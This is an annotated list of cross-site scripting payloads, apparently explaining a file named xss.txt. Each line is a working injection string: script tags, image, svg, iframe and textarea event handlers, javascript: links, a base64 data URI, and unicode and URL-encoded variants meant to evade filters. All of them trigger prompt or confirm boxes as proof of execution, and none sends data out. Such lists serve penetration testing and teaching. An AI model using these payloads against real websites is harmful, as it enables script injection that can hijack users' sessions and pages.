This is the interpretation to the payloads in the file xss.txt

// pop a prompt box that writes "1"
</script>"><script>prompt(1)</script>

// change some lower case letters to the capital to test if the script works
</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>

// an image with non-existent source (so there must be an error) and pop a prompt box when error occurs
"><img src=x onerror=prompt(1)>

// an svg object that pop a prompt box after loading
"><svg/onload=prompt(1)>

// an iframe whose source is a JS code
"><iframe/src=javascript:prompt(1)>

// an HTML tag that contains pop-up prompt
"><h1 onclick=prompt(1)>Clickme</h1>

// a link says "click me" that can lead to pup-up prompt
"><a href=javascript:prompt(1)>Clickme</a>

// %28 represents "(" while %29 represents ")", thus the JS command is "confirm(1)", which means
// this is also a link that can lead to pop-up malicious script
"><a href="javascript:confirm%28 1%29">Clickme</a>

// the ciphertext encrypted by base64, whose plain text is "<svg/onload=alert(2)>"
"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>

// a text area that can be focused automatically and execute scripts
"><textarea autofocus onfocus=prompt(1)>

// a script coded by unicode, whose plain text is "confirm("1")"
"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>

// a script coded by unicode, whose plain text is "confirm`1`"
"><script>co\u006efir\u006d`1`</script>

// similar to the one above, but changed some lower case letters to capital
"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>

// an image with non-existence resource, and the error info is "confirm`1`" coded by unicode
"><img src=x onerror=co\u006efir\u006d`1`>

// an svg object that can execute the command "confirm`1`" after loading
"><svg/onload=co\u006efir\u006d`1`>

// an iframe whose source is a script that can execute the command "confirm(1)"
"><iframe/src=javascript:co\u006efir\u006d%28 1%29>

// a link that can execute the script "confirm(1)" when clicked
"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>

// a link that can execute the script "prompt(1)" when clicked
"><a href=javascript:prompt%28 1%29>Clickme</a>

// a link that can execute the script "confirm(1)" when clicked, but the script is encrypted
// by both unicode and url code
"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>

// a text area that can focus automatically and execute the script "comfrim(1)"
"><textarea autofocus onfocus=co\u006efir\u006d(1)>

// when operate the details element, the script "comfirm'1'" can be triggered
"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome

// %0A means a new line, thus this is a <p> tag whose id is 1 and
// has the contains malicious script "onmousemove=confirm`1`"
"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme

// an image whose sourse is x and execute "prompt'1'" when error occurs
"><img/src=x%0Aonerror=prompt`1`>

// an iframe hose source document is "<img src=x:x onerror=alert(1)>"
"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">

// an <h1> tag that can execute "prompt'1'" when the user does what it says (drag)
"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>